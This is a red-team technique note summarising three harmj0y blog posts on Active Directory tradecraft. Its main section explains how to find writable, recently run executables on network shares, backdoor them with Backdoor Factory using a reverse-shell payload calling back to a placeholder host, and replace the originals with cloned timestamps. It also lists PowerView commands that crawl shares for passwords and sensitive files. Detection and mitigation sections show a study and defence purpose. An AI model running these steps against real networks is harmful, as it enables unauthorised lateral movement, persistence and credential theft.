---
title: harmj0y Misc Tradecraft
aliases: ["harmj0y Misc Tradecraft", "Targeted Trojanation", "Trojaning Network Shares", "Push it Push it Real Good", "Sheets on Sheets on Sheets", "PowerView Data Mining", "Cheat Sheets"]
type: technique
domain: [active-directory, red-team, windows-internals]
attack_tactic: [recon, lateral-movement, persistence]
tags: [type/technique, domain/red-team, domain/active-directory, attack/recon, attack/lateral-movement, attack/persistence]
source:
  - "[[Source - harmj0y blog]]"
source_url: "https://blog.harmj0y.net/redteaming/targeted-trojanation/"
verified: true
related: ["[[PowerView]]", "[[User Hunting]]", "[[Credential Hunting]]", "[[Domain and Forest Trusts]]", "[[Forest Trust Abuse]]", "[[PowerUp]]", "[[Empire]]", "[[GhostPack]]", "[[Remote Execution & Lateral Movement (Windows)]]"]
created: 2026-06-07
updated: 2026-06-07
---

# harmj0y Misc Tradecraft

> [!summary] One-liner
> A collection of three smaller harmj0y tradecraft posts: (1) **Targeted Trojanation** — find a *writable, frequently-run* `.exe` on a network share, replace it with a backdoored copy (with cloned MAC timestamps) to spread laterally and persist without local admin; (2) **Push it, Push it Real Good** — the philosophy and PowerView toolkit for pushing full red-team tradecraft (situational awareness, trust enumeration, data mining) into time-limited engagements; (3) **Sheets on Sheets on Sheets** — release of the official PowerView / PowerUp / Empire cheat sheets.

This note is a brief roundup; each section maps to one post. For the heavy techniques (user/session hunting, trust abuse) see the dedicated notes [[User Hunting]], [[Domain and Forest Trusts]], and [[Forest Trust Abuse]].

---

## 1. Targeted Trojanation

> [!summary]
> When local privilege escalation fails, you can still move laterally as an **unprivileged domain user** by finding a network-share executable you can *write* to that someone else *runs*, and swapping it for a trojaned version.

### Concept abused
Many organizations stage binaries (installers, internal utilities, line-of-business tools, login-script EXEs) on file shares. Two misconfigurations make this exploitable:

- **Write access** to the share/file is granted more broadly than execute-only intent (often "Everyone" or "Authenticated Users").
- The executable is **routinely launched by other users / admins**, sometimes in a more privileged context than yours.

Replace the binary with a backdoored copy and you inherit the privileges of whoever next runs it — a credential-/session-gathering opportunity that doubles as persistence.

### Prerequisites
- A foothold as any domain user with read access to enumerate shares.
- **Write access** to at least one share holding an executable.
- The trojaned EXE must still run normally (so the original user is none the wiser); use a binary backdoorer that preserves functionality.

### How the attack works
1. Enumerate shares you can reach and check access.
2. Within readable/writable shares, find **recently-used** executables (recent access/modify times imply someone actually runs them) that you also have **write** access to.
3. Generate a backdoored version of the target EXE with a tool like **Backdoor Factory** (injects shellcode/payload into the PE while keeping the original program working).
4. Copy the trojaned EXE over the original, **cloning the MAC (Modified/Accessed/Created) timestamps** of the original file so the swap doesn't stand out in timestamp review.
5. Wait for the target (ideally a privileged user) to execute it; collect your shell/credentials.

> [!note] Tradecraft
> Targeting *recently-run* binaries (`-FreshEXEs`) raises the odds your trojan executes soon, and cloning MAC times defeats naive "what changed recently" triage. Timestamp cloning is **not** a perfect hide — file integrity/AV/EDR and SACL auditing can still flag the write.

### Commands & tools
PowerView — find accessible shares, then writable recently-used EXEs in them:
```powershell
# Enumerate shares we can access (skip IPC$ and print shares)
Invoke-ShareFinder -ExcludeIPC -ExcludePrint -CheckShareAccess

# Find recently-used .exe files we can WRITE to across those shares
Invoke-FileFinder -ShareList <SHARELIST.txt> -FreshEXEs -ExcludeHidden -CheckWriteAccess
```

PowerView — copy the trojan over the original, cloning MAC timestamps:
```powershell
# Old PowerView 1.x name
Invoke-CopyFile -SourceFile <TROJANED.EXE> -DestFile "\\<TARGET>\<share>\<file>.exe"

# PowerView 2.0+ renamed this to:
Copy-ClonedFile -SourceFile <TROJANED.EXE> -DestFile "\\<TARGET>\<share>\<file>.exe"
```

Backdoor Factory (Joshua Pitts) — inject a payload into a PE while keeping it functional:
```bash
# Patch an existing EXE with a reverse shell, preserving original execution
backdoor-factory -f <ORIGINAL.exe> -s reverse_shell_tcp -H <LHOST> -P <LPORT>
```
> [!note] Backdoor Factory is also integrated into **Veil-Evasion**, which can drive it as part of payload generation.

### Detection / artifacts
- **File modification on shares**: a binary's hash/size changing while its MAC times remain static is itself anomalous (cloned timestamps but new content).
- **EDR/AV** on the file server or executing host flagging the patched PE / injected shellcode.
- **Object access auditing (SACL)** on share directories logging write events from an unexpected account.
- Process telemetry: a known-good signed-or-expected binary suddenly spawning network connections / child processes.

### Mitigation
- Lock share/file ACLs to **read+execute, not write** for general users; restrict write to admins/deploy accounts.
- **Application allowlisting** (WDAC/AppLocker) and code-signing enforcement so unsigned/altered binaries won't run.
- File integrity monitoring on staging/deployment shares.

---

## 2. Push it, Push it Real Good

> [!summary]
> The "why" behind PowerView/PowerUp: take expert red-team tradecraft that "used to take days to weeks" and **push it down into short, time-limited engagements** through PowerShell automation and shared knowledge.

This post is a philosophy/manifesto post, not a single exploit. It groups tradecraft into three areas, each enabled by [[PowerView]] (and reflected across the dedicated notes here):

- **Network situational awareness / user hunting** — rapidly locate target users and where you have admin, even when standard tooling is unavailable. Cmdlets: `Invoke-UserHunter`, `Invoke-StealthUserHunter`, `Get-NetLocalGroup`. (This is a PowerShell port of `netview.exe` functionality.) See [[User Hunting]].
- **Domain trust enumeration & abuse** — systematically map and exploit trust relationships for cross-forest lateral movement; PowerView trust functions take a `-Domain X` argument, and Justin Warner's **DomainTrustExplorer** graphs/visualizes the results. See [[Domain and Forest Trusts]] and [[Forest Trust Abuse]].
- **Data mining / file-server triage** — find the organizational "crown jewels," shifting effort from *getting access* (easy) to *finding what matters*. Cmdlets below. See [[Credential Hunting]].

### Data-mining commands (PowerView)
```powershell
# Triage files on the LOCAL host by keyword
Invoke-SearchFiles -Path <PATH> -Terms <kw1>,<kw2>

# Crawl file shares network-wide for sensitive files (by name and content)
Invoke-FileFinder

# Pull file servers straight out of Active Directory (user homeDirectory/profilePath)
Get-NetFileServers

# Query the Windows Search Index on remote workstations over WMI
Invoke-MassSearch
```

> [!note] `Invoke-FileFinder` / the Search-Index approach match on file **content** by keyword, not just filenames — useful for finding password files, config files, PII, etc. without dragging entire shares back.

### Detection / artifacts
- Mass SMB enumeration and content searches generate broad share access and (for `Invoke-MassSearch`) **remote WMI** activity — both observable in network/host telemetry.
- See [[User Hunting]] for the session/local-group enumeration footprint.

---

## 3. Sheets on Sheets on Sheets

> [!summary]
> Release announcement of official cheat sheets for the three core PowerShell offensive tools, as a quick reference for new adopters.

| Tool | Pages | Purpose |
|---|---|---|
| [[PowerView]] | 2 | Active Directory enumeration |
| [[PowerUp]] | 1 | Local privilege-escalation checks |
| [[Empire]] | 2 | Post-exploitation framework |

- Hosted at `https://github.com/HarmJ0y/CheatSheets/` under **Creative Commons v3 Attribution**, versioned via footnotes.
- The post notes (as of late 2015) that **PowerView and PowerUp were being integrated into PowerSploit**, having temporarily lived in the PowerTools repo during migration. (Both later evolved into the [[GhostPack]] ecosystem / SharpView etc.)

No exploit content here — included for completeness of the harmj0y tradecraft corpus.

---

## Related
- [[PowerView]] — the toolkit underpinning all three posts (ShareFinder, FileFinder, CopyFile/Copy-ClonedFile, UserHunter, trust functions).
- [[PowerUp]], [[Empire]], [[GhostPack]] — the rest of the tool corpus.
- [[User Hunting]] — deep dive on the situational-awareness tradecraft referenced in "Push it".
- [[Domain and Forest Trusts]], [[Forest Trust Abuse]] — trust enumeration/abuse referenced in "Push it".
- [[Credential Hunting]] — data-mining / crown-jewel discovery.
- [[Remote Execution & Lateral Movement (Windows)]] — alternative lateral-movement paths when trojanation isn't available.

## Sources
- harmj0y — "Targeted Trojanation": https://blog.harmj0y.net/redteaming/targeted-trojanation/
- harmj0y — "Push it, Push it Real Good": https://blog.harmj0y.net/redteaming/push-it-push-it-real-good/
- harmj0y — "Sheets on Sheets on Sheets": https://blog.harmj0y.net/redteaming/sheets-on-sheets-on-sheets/
